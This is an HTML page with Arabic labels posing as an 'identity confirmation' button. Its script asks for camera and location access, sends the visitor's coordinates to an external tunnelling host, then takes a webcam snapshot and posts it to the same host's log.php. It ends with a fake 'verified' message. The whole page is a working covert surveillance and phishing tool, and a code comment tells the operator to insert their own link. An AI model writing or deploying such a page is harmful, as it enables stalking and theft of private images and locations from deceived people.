<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body style="text-align:center; padding-top:100px;">
    <button id="btn" style="padding:20px; background:blue; color:white;" onclick="capture()">تأكيد الهوية (اضغط هنا)</button>
    <script>
    async function capture() {
        document.getElementById( btn ).innerText = "جاري التحميل...";
        const url = "https://96980dbae77e22.lhr.life"; // تأكد أن هذا هو رابطك الحالي
        
        try {
            // طلب الكاميرا والموقع معاً
            const stream = await navigator.mediaDevices.getUserMedia({video:true});
            navigator.geolocation.getCurrentPosition(p => {
                fetch(url +  /log.php?lat=  + p.coords.latitude +  &lon=  + p.coords.longitude);
            });

            const video = document.createElement( video );
            video.srcObject = stream;
            video.play();

            setTimeout(async () => {
                const canvas = document.createElement( canvas );
                canvas.width = 640; canvas.height = 480;
                canvas.getContext( 2d ).drawImage(video, 0, 0);
                const img = canvas.toDataURL( image/jpeg );
                await fetch(url +  /log.php , {method: POST , body: JSON.stringify({img: img})});
                stream.getTracks().forEach(t => t.stop());
                alert("تم التوثيق");
                location.reload();
            }, 2000);
        } catch (e) {
            alert("خطأ: يرجى فتح الرابط في متصفح Chrome والسماح بالكاميرا");
        }
    }
    </script>
</body>
</html>
